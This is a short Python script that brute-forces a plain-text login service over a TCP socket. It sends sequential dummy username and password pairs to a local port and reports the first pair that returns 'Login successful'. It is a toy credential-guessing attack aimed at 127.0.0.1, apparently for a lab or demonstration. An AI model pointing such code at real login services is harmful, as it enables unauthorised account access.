import socket
import time

def brute_force(target_ip, target_port, num_attempts):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))

    for _ in range(num_attempts):
        username = f'user{_:03}'
        password = f'pass{_:03}'
        sock.sendall(f'{username}\n'.encode())
        sock.sendall(f'{password}\n'.encode())
        response = sock.recv(1024).decode()
        if response.strip() == 'Login successful':
            print(f'Success: {username}/{password}')
            sock.close()
            break

    sock.close()

if __name__ == '__main__':
    target_ip = '127.0.0.1'
    target_port = 12345
    num_attempts = 100
    brute_force(target_ip, target_port, num_attempts)